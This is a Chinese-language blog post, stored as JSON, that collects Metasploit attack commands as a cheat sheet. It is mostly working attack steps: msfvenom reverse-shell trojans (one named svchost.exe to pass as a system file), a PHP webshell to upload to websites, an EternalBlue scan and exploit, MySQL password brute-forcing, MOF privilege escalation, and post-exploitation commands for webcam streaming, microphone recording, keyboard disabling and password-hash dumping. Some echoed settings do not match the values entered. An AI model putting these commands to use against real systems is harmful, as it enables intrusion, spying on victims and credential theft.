{"title":"Metasploit一些常用攻击","slug":"2019-02-12-Metasploit一些常用攻击","date":"2019-02-11T16:00:00.000Z","updated":"2019-03-04T08:32:56.632Z","comments":true,"excerpt":"","content":"<blockquote>\n<p>整理一些msf常用攻击命令</p>\n</blockquote>\n<h2 id=\"生成windows-exe木马\"><a href=\"#生成windows-exe木马\" class=\"headerlink\" title=\"生成windows exe木马\"></a>生成windows exe木马</h2><h4 id=\"利用msfvenom生成exe木马\"><a href=\"#利用msfvenom生成exe木马\" class=\"headerlink\" title=\"利用msfvenom生成exe木马\"></a>利用msfvenom生成exe木马</h4><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.17 lport=1234 -f exe -o svchost.exe\n</code></pre><h4 id=\"运行exe，msf建立会话\"><a href=\"#运行exe，msf建立会话\" class=\"headerlink\" title=\"运行exe，msf建立会话\"></a>运行exe，msf建立会话</h4><pre><code>msf &gt; use exploit/multi/handler\nmsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(multi/handler) &gt; set LHOST 192.168.1.17(攻击者ip)\nLHOST =&gt; 192.168.1.3\nmsf exploit(multi/handler) &gt; set LPORT 1234(反弹端口)\nLPORT =&gt; 1234\nmsf exploit(multi/handler) &gt; exploit\n</code></pre><h2 id=\"生成php木马\"><a href=\"#生成php木马\" class=\"headerlink\" title=\"生成php木马\"></a>生成php木马</h2><h4 id=\"利用msfvenom生成php木马\"><a href=\"#利用msfvenom生成php木马\" class=\"headerlink\" title=\"利用msfvenom生成php木马\"></a>利用msfvenom生成php木马</h4><pre><code>msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.1.17 lport=1234 -f raw&gt;./fanxing.php\n</code></pre><h4 id=\"上传php马到网站目录下，访问，建立会话\"><a href=\"#上传php马到网站目录下，访问，建立会话\" class=\"headerlink\" title=\"上传php马到网站目录下，访问，建立会话\"></a>上传php马到网站目录下，访问，建立会话</h4><pre><code>msf &gt; use exploit/multi/handler\nmsf exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp\npayload =&gt; php/meterpreter_reverse_tcp\nmsf exploit(multi/handler) &gt; set lhost 192.168.1.17\nlhost =&gt; 192.168.1.9\nmsf exploit(multi/handler) &gt; set lport 1234\nlport =&gt; 123\nmsf exploit(multi/handler) &gt; exploit\n</code></pre><h4 id=\"建立会话后常用命令\"><a href=\"#建立会话后常用命令\" class=\"headerlink\" title=\"建立会话后常用命令\"></a>建立会话后常用命令</h4><pre><code>po                 #查看进程\nmigrate            #注入进程\nrun vnc            #查看远程桌面\ncat                #查看文件\nedit            #编辑文件\nupload            #上传文件\ndownload        #下载文件\nrm                #删除文件\nmkdir           #创建文件夹\nrmdir            #删除文件夹\nsessions -l     #查看会话\nbackground        #退出当前会话\nenumdesktops    #在线用户数\nuictl disable keyboard  #让键盘失效\nuictl enable keyboard        #恢复键盘\nrecord_mic -d 10 #音频录制\nwebcam_stream    #开启摄像头\nscreenshot        #桌面抓图\nsysinfo            #系统信息查询\ngetsystem        #获取最高权限\nhashdump        #密码hash\n</code></pre><h2 id=\"msf利用ms17-010\"><a href=\"#msf利用ms17-010\" class=\"headerlink\" title=\"msf利用ms17_010\"></a>msf利用ms17_010</h2><h4 id=\"扫描ms17-010\"><a href=\"#扫描ms17-010\" class=\"headerlink\" title=\"扫描ms17_010\"></a>扫描ms17_010</h4><pre><code>msf &gt; use auxiliary/scanner/smb/smb_ms17_010\nmsf auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOSTS 192.168.1.0/24(扫描网段)\nRHOSTS =&gt; 172.168.1.0/24\nmsf auxiliary(scanner/smb/smb_ms17_010) &gt; exploit\n</code></pre><h4 id=\"利用ms17-010\"><a href=\"#利用ms17-010\" class=\"headerlink\" title=\"利用ms17_010\"></a>利用ms17_010</h4><pre><code>msf &gt; use exploit/windows/smb/ms17_010_eternalblue \nmsf exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOST 192.168.1.3\nRHOST =&gt; 192.168.1.3(需要攻击的ip)\nmsf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit\n</code></pre><h2 id=\"msf攻击mysql\"><a href=\"#msf攻击mysql\" class=\"headerlink\" title=\"msf攻击mysql\"></a>msf攻击mysql</h2><h4 id=\"判断数据库是否外链\"><a href=\"#判断数据库是否外链\" class=\"headerlink\" title=\"判断数据库是否外链\"></a>判断数据库是否外链</h4><pre><code>msf &gt; use auxiliary/scanner/mysql/mysql_version\nmsf auxiliary(scanner/mysql/mysql_version) &gt; set RHOSTS 192.168.1.5\nRHOSTS =&gt; 192.168.1.5\nmsf auxiliary(scanner/mysql/mysql_version) &gt; exploit\n外链会显示数据库版本信息\n</code></pre><h4 id=\"暴力破解mysql数据库\"><a href=\"#暴力破解mysql数据库\" class=\"headerlink\" title=\"暴力破解mysql数据库\"></a>暴力破解mysql数据库</h4><pre><code>msf auxiliary(scanner/mysql/mysql_login) &gt; set RHOSTS 192.168.1.5\nRHOSTS =&gt; 192.168.1.5\nmsf auxiliary(scanner/mysql/mysql_login) &gt; set USERNAME root\nUSERNAME =&gt; root\nmsf auxiliary(scanner/mysql/mysql_login) &gt; set PASS_FILE /pass.txt\nPASS_FILE =&gt; /pass.txt(设置密码爆破字典)\nmsf auxiliary(scanner/mysql/mysql_login) &gt; exploit\n</code></pre><h4 id=\"mysql-MOF提权\"><a href=\"#mysql-MOF提权\" class=\"headerlink\" title=\"mysql MOF提权\"></a>mysql MOF提权</h4><pre><code>msf &gt; use exploit/windows/mysql/mysql_mof \nmsf exploit(windows/mysql/mysql_mof) &gt; set RHOST 192.168.1.5\nRHOST =&gt; 192.168.1.5\nmsf exploit(windows/mysql/mysql_mof) &gt; set USERNAME root\nUSERNAME =&gt; root\nmsf exploit(windows/mysql/mysql_mof) &gt; set PASSWORD 123456\nPASSWORD =&gt; 123456\nmsf exploit(windows/mysql/mysql_mof) &gt; exploit\n</code></pre>","categories":[],"tags":[{"name":"msf","path":"api/tags/msf.json"}]}